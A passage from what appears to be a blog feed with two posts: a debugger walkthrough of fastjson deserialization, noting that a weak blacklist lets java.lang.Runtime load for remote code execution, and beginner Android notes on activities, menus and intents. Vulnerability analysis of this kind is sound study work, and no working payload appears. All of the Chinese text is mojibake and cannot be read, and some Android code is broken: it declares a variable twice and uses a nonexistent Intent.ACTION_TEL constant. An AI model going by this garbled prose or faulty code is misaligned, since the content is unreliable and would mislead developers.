<h2 id="ååºåˆ—åŒ–æµç¨‹"><a href="#ååºåˆ—åŒ–æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–æµç¨‹"></a>ååºåˆ—åŒ–æµç¨‹</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;harry&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">22</span>);</span><br><span class="line">        person.setGender(<span class="string">&quot;male&quot;</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–å…¥å£parseObject</span></span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ååºåˆ—åŒ–å…¥å£,æ–­ç‚¹æ›´è¿›ï¼</p>
<p>ç„¶åæ¥åˆ°parseObjectå‡½æ•°å†…éƒ¨ï¼Œä½äº<code>JSON.class</code> line 201</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427219770-2021-11-911:06:59.png"></p>
<p>ç»§ç»­æ›´è¿›parseObjectå‡½æ•°çš„parseå‡½æ•°ã€€æ¥åˆ°äº†line 128</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427400491-2021-11-911:10:00.png"></p>
<p>ç„¶åè·Ÿè¿›DefaultJsonParserå‡½æ•°è¿›å…¥<code>DefultJSONParser.class</code>ï¼Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636427924973-2021-11-911:18:44.png"></p>
<p>è§¦å‘äº†ä¸Šé¢è¿™ä¸ªé‡è½½ï¼Œæ¥åˆ°ä¸‹å›¾line 175,å‡½æ•°çš„ä½œç”¨å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦ä»…é‚£ä¸ªäº†åˆ¤æ–­å¹¶æ ‡è®°ä¸ºå¸¸é‡å€¼ä»¥åˆ¤æ–­ç±»å‹</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424111757-2021-11-910:15:11.png"></p>
<p>ç»§ç»­æ”¾è¡Œï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­åˆšåˆšä¼ å¯¼å‡ºæ¥çš„ç±»å‹å³<code>&#123;</code>ä¸º12</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636423248501-2021-11-910:00:48.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424290738-2021-11-910:18:10.png"></p>
<p>ç»§ç»­æ”¾è¡Œæ¥åˆ°äº†line 322è¿™ä¸ªifå—ï¼Œè¿™é‡Œæ˜¯å¾—åˆ°æˆ‘ä»¬ä¼ å…¥ç±»çš„ç±»å</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636424779575-2021-11-910:26:19.png"></p>
<p>step overæ¥åˆ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è½½å…¥ç±»   </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¼ å…¥ç±»</span></span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="comment">//å¦‚æœç±»ä¸æ˜¯å†…ç½®ç±»å‹ï¼Œé‚£å°±è½½å…¥ç”¨æˆ·ä¼ å…¥çš„ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">          </span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425593359-2021-11-910:39:53.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425649245-2021-11-910:40:49.png"></p>
<p>è½½å…¥å‰åçš„mappingsçš„å˜åŒ–ï¼è‡ªå®šä¹‰çš„ç±»è¢«è½½å…¥è¿›æ¥äº†</p>
<p>step in è¿™ä¸ªgetDeserializerå‡½æ•°ï¼Œè·³å…¥<code>ParserConfig.class</code>æœ‰ä¸€ä¸ªé»‘åå•è¿‡æ»¤,é»‘åå•ä¸­åªå¯¹<code>java.lang.Thread</code>è¿›è¡Œäº†é™åˆ¶ï¼Œå…¶ä»–ç±»å‡å¯ä»¥è½½å…¥ï¼</p>
<p>è‡³æ­¤<code>java.lang.Runtime</code>è¢«æ­£å¸¸è½½å…¥ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªç±»è¿›è¡ŒRCE,åœ¨ç¨‹åºè°ƒç”¨ååºåˆ—åŒ–çš„å‡½æ•°<code>parseObject</code>çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636425819753-2021-11-910:43:39.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636426480234-2021-11-910:54:40.png"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Androidè¯­æ³•ç¬”è®°(Java)</title>
    <url>/2021/11/06/android/</url>
    <content><![CDATA[<h2 id="Androidç¬”è®°"><a href="#Androidç¬”è®°" class="headerlink" title="Androidç¬”è®°"></a>Androidç¬”è®°</h2><span id="more"></span>

<ul>
<li><p>å®‰è£…é¿å‘ï¼šgradleæ— æ³•åŒæ­¥æˆåŠŸï¼ˆ Gradle sync failed: Cause: dl.google.com:443 failed to respond ï¼‰</p>
<p><a href="https://github.com/itgoyo/AndroidSummary/issues/59">https://github.com/itgoyo/AndroidSummary/issues/59</a></p>
</li>
</ul>
<h3 id="å·¥ç¨‹ç›®å½•ç»“æ„"><a href="#å·¥ç¨‹ç›®å½•ç»“æ„" class="headerlink" title="å·¥ç¨‹ç›®å½•ç»“æ„"></a>å·¥ç¨‹ç›®å½•ç»“æ„</h3><p>â””â”€â”€ HelloWorld<br>    â”œâ”€â”€ app    é¡¹ç›®ä»£ç ï¼Œèµ„æº<br>    â”‚   â”œâ”€â”€ buildã€€ç¼–è¯‘è‡ªåŠ¨ç”Ÿæˆ<br>    â”‚   â”œâ”€â”€ build.gradle<br>    â”‚   â”œâ”€â”€ libs    é¡¹ç›®ä¸­å¼•ç”¨çš„ç¬¬ä¸‰æ–¹jaråŒ…<br>    â”‚   â”œâ”€â”€ proguard-rules.proã€€åŠ å¯†æ··æ·†ï¼Œé˜²é€†å‘ç ´è§£<br>    â”‚   â””â”€â”€ srcã€€ã€€èµ„æºç›®å½•<br>    â”œâ”€â”€ build.gradleã€€é¡¹ç›®å…¨å±€çš„gradleæ„æ¶è„šæœ¬<br>    â”œâ”€â”€ gradleã€€            gradle wrapperé…ç½®æ–‡ä»¶<br>    â”‚   â””â”€â”€ wrapper<br>    â”œâ”€â”€ gradle.properties        gradle  å…¨å±€é…ç½®æ–‡ä»¶<br>    â”œâ”€â”€ gradlew<br>    â”œâ”€â”€ gradlew.bat<br>    â”œâ”€â”€ local.properties       æŒ‡å®šæœ¬æœºä¸­android sdkè·¯å¾„<br>    â””â”€â”€ settings.gradleã€€ã€€æŒ‡å®šé¡¹ç›®ä¸­æ‰€æœ‰å¼•å…¥çš„æ¨¡å—</p>
<p>èµ„æºç›®å½•src</p>
<p>â”œâ”€â”€ androidTestã€€ã€€ã€€æµ‹è¯•ç”¨ä¾‹<br>â”‚   â””â”€â”€ java<br>â”‚       â””â”€â”€ com<br>â”œâ”€â”€ main<br>â”‚   â”œâ”€â”€ AndroidManifest.xmlã€€ã€€æ•´ä¸ªandroidé¡¹ç›®é…ç½®æ–‡ä»¶<br>â”‚   â”œâ”€â”€ java<br>â”‚   â”‚   â””â”€â”€ com<br>â”‚   â””â”€â”€ resã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€èµ„æºç›®å½•<br>â”‚       â”œâ”€â”€ drawableã€€ã€€ã€€ã€€ã€€ã€€æ”¾å›¾ç‰‡ï¼Œdrawableå¼€å¤´<br>â”‚       â”œâ”€â”€ drawable-v24<br>â”‚       â”œâ”€â”€ layoutã€€ã€€ã€€ã€€ã€€ã€€ã€€å¸ƒå±€æ–‡ä»¶<br>â”‚       â”œâ”€â”€ mipmap-anydpi-v26 ç”±mipmapå¼€å¤´çš„éƒ½æ˜¯ç”¨æ¥æ”¾å›¾æ ‡çš„<br>â”‚       â”œâ”€â”€ mipmap-hdpi<br>â”‚       â”œâ”€â”€ mipmap-mdpi<br>â”‚       â”œâ”€â”€ mipmap-xhdpi<br>â”‚       â”œâ”€â”€ mipmap-xxhdpi<br>â”‚       â”œâ”€â”€ mipmap-xxxhdpi<br>â”‚       â”œâ”€â”€ values<br>â”‚       â””â”€â”€ values-night<br>â””â”€â”€ testã€€ã€€ã€€ç”¨äºUnit test<br>    â””â”€â”€ java<br>        â””â”€â”€ com</p>
<p>resç›®å½•ä¸­å®šä¹‰çš„xmlæ–‡ä»¶å¯ä»¥åœ¨æ–°çš„xmlæ–‡ä»¶æˆ–è€…javaä»£ç ä¸­è¢«å¼•ç”¨</p>
<p>ä¾‹å¦‚resä¸‹æœ‰ä¸€ä¸ªã€€strings.xmlã€€æ–‡ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>HelloWorldApplication<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ™åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­ä½œä¸ºé¡¶æ åº”ç”¨åæ˜¾ç¤º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:label=&quot;@string/app_name&quot;</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨ä»£ç ä¸­å¼•ç”¨åˆ™ç”¨<code>R.String.app_name</code></p>
<h3 id="å®‰å“çš„log"><a href="#å®‰å“çš„log" class="headerlink" title="å®‰å“çš„log"></a>å®‰å“çš„log</h3><p>log.v() verbose</p>
<p>log.d() debug</p>
<p>log.i() info</p>
<p>log.w() warinning </p>
<p>log.e() error</p>
<p>ç›´æ¥ç±»æ¯”è¾“å‡ºè¯­å¥ï¼Œè¾“å‡ºåœ¨logcatä¸­</p>
<h2 id="activity"><a href="#activity" class="headerlink" title="activity"></a>activity</h2><p> æ´»åŠ¨æ˜¯ä¸€ç§å¯ä»¥åŒ…å«ç”¨æˆ·ç•Œé¢çš„ç»„ä»¶ï¼Œç”¨äºå’Œç”¨æˆ·äº¤äº’</p>
<ul>
<li><p>æ‰‹åŠ¨åˆ›å»ºæ´»åŠ¨</p>
<ol>
<li><p>åœ¨app/src/main/javaä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„æ´»åŠ¨firstActivity.java</p>
</li>
<li><p>/app/src/main/resä¸‹æ–°å»ºlayoutç›®å½•ï¼Œå¹¶ä¸”åœ¨ç›®å½•ä¸­æ–°å»ºä¸€ä¸ªå¸ƒå±€ï¼Œå‘½åä¸ºfirt_layoutï¼Œåœ¨å¸ƒå±€ä¸­æ–°å»ºæŒ‰é’®</p>
</li>
<li><p>åœ¨firstActivity.javaçš„OnCreateé‡è½½å‡½æ•°ä¸­åŠ è½½å¸ƒå±€<code>setContentView(R.layout.first_layout)</code></p>
</li>
<li><p>åœ¨AndroidManifest.xmlä¸­æ³¨å†Œä¸ºä¸»æ´»åŠ¨</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;.firstActivity&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;this is firstactivaty&quot;</span>&gt;</span>ã€€ã€€<span class="comment">&lt;!--åº”ç”¨ç¨‹åºæ˜¾ç¤ºçš„åå­—        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ³¨å†Œä¸ºä¸»æ´»åŠ¨       --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--    æ³¨å†Œä¸ºå¯åŠ¨    --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>tips: ctrl + oã€€ï¼¡ï¼³ä¸­è§¦å‘å‡½æ•°é‡å†™æ¨¡æ¿</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//toast ä½¿ç”¨æ–¹æ³•</span></span><br><span class="line"><span class="comment">//param: context , text ,show_time</span></span><br><span class="line"><span class="comment">//contextä¸ºtoastæ˜¾ç¤ºçš„ä¸Šä¸‹æ–‡ï¼Œthisè¡¨ç¤ºå½“å‰çš„æ´»åŠ¨</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºtoastæ˜¾ç¤ºçš„æ—¶é•¿ï¼Œæœ‰ä¸¤ä¸ªLENGTH_SHORT,LENGTH_LONG</span></span><br><span class="line">Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;toastæ˜¾ç¤ºçš„å†…å®¹&quot;</span>, Toast.LENGTH_SHORT).show();</span><br></pre></td></tr></table></figure>



<h3 id="èœå•ä½¿ç”¨æ–¹æ³•"><a href="#èœå•ä½¿ç”¨æ–¹æ³•" class="headerlink" title="èœå•ä½¿ç”¨æ–¹æ³•"></a>èœå•ä½¿ç”¨æ–¹æ³•</h3><p>åœ¨resæ–‡ä»¶å¤¹ä¸­åˆ›å»ºmenuç›®å½•ï¼Œå¹¶ä¸”åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºæ–‡ä»¶ï¼ˆmain.xmlï¼‰</p>
<p><code>@+id/test</code>æ˜¯æ³¨å†Œä¸€ä¸ªæ–°çš„ï½‰ï½„é€‰é¡¹ï¼Œå¯ä»¥è¢«ï½Šï½ï½–ï½è°ƒç”¨</p>
<p>R.id.test</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   å®šä¹‰äº†èœå•ä¸¤ä¸ªé¡¹ç›®ï¼Œadd,remove     --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/add_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Add&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/remove_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Remove&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    åˆ›å»ºèœå•æ  /res/menu/main.xml</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main,menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ç›¸åº”èœå•é€‰é¡¹è§¦å‘çš„äº‹ä»¶</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(<span class="meta">@NonNull</span> MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (item.getItemId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;you clicked add&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;you click Remove&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>é”€æ¯æ´»åŠ¨åªéœ€ä¸€ä¸ªå‡½æ•°<code>finsh()</code></p>
<h3 id="intentå¯åŠ¨activity"><a href="#intentå¯åŠ¨activity" class="headerlink" title="intentå¯åŠ¨activity"></a>intentå¯åŠ¨activity</h3><h4 id="æ˜¾å¼è°ƒç”¨"><a href="#æ˜¾å¼è°ƒç”¨" class="headerlink" title="æ˜¾å¼è°ƒç”¨"></a>æ˜¾å¼è°ƒç”¨</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//äº‹å…ˆåˆ›å»ºå¥½çš„secondActivity.java</span></span><br><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//  intent æ˜¾å¼è°ƒç”¨</span></span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="éšå¼è°ƒç”¨"><a href="#éšå¼è°ƒç”¨" class="headerlink" title="éšå¼è°ƒç”¨"></a>éšå¼è°ƒç”¨</h4><p>ä¸ºåˆ›å»ºå¥½çš„ç¬¬äºŒä¸ªæ´»åŠ¨æ³¨å†Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.secondActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨firstActivity.javaä¸­è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"><span class="comment">//              intentã€€éšå¼æ‰ç”¨</span></span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span>);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ä½¿ç”¨éšå¼è°ƒç”¨å…¶ä»–ç³»ç»ŸåŠŸèƒ½</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">       button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">               <span class="comment">//æ‹‰èµ·ç³»ç»Ÿæµè§ˆå™¨</span></span><br><span class="line">               Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">               intent.setData(Uri.parse(<span class="string">&quot;http://www.baidu.com&quot;</span>));</span><br><span class="line">               <span class="comment">//æ‹‰èµ·ç”µè¯ç•Œé¢</span></span><br><span class="line">               Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_TEL);</span><br><span class="line">               intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">               startActivity(intent);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="intentæ•°æ®ä¼ é€’"><a href="#intentæ•°æ®ä¼ é€’" class="headerlink" title="intentæ•°æ®ä¼ é€’"></a>intentæ•°æ®ä¼ é€’</h3><h4 id="å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’"><a href="#å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’" class="headerlink" title="å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’"></a>å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’</h4>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fitstActivity.java</span></span><br><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;extra_Data&quot;</span>,<span class="string">&quot;sent&quot;</span>);<span class="comment">//ç»™intentåŠ ä¸Šé¢å¤–çš„ä¿¡æ¯</span></span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//secondActivity.java   </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_second);</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String data = intent.getStringExtra(<span class="string">&quot;extra_Data&quot;</span>);<span class="comment">//å› ä¸ºä¼ é€æ¶ˆæ¯æ˜¯Stringæ‰€ä»¥getStringExtra,å¦‚æœboolå°±getBooleanExtra</span></span><br><span class="line">        Log.d(<span class="string">&quot;secondActivity&quot;</span>  ,data );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="å‘ä¸Šä¸€ä¸ªæ´»åŠ¨ä¼ é€’"><a href="#å‘ä¸Šä¸€ä¸ªæ´»åŠ¨ä¼ é€’" class="headerlink" title="å‘ä¸Šä¸€ä¸ªæ´»åŠ¨ä¼ é€’"></a>å‘ä¸Šä¸€ä¸ªæ´»åŠ¨ä¼ é€’</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fitstActivity.java</span></span><br><span class="line"><span class="comment">//åˆ›å»ºéœ€è¦è¿”å›ç»“æœçš„æ´»åŠ¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.first_layout);</span><br><span class="line">        Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                <span class="comment">//startActivityForResultå‡½æ•°ï¼šå½“å¯åŠ¨çš„æ´»åŠ¨é”€æ¯æ—¶è¿”å›ç»“æœç»™ä¸Šä¸€ä¸ªæ´»åŠ¨</span></span><br><span class="line">                startActivityForResult(intent,<span class="number">1</span>);<span class="comment">//è¿™é‡Œçš„ï¼‘æ˜¯requestcode ,åªè¦æ˜¯ä¸ªå”¯ä¸€å€¼éƒ½å¯ä»¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span 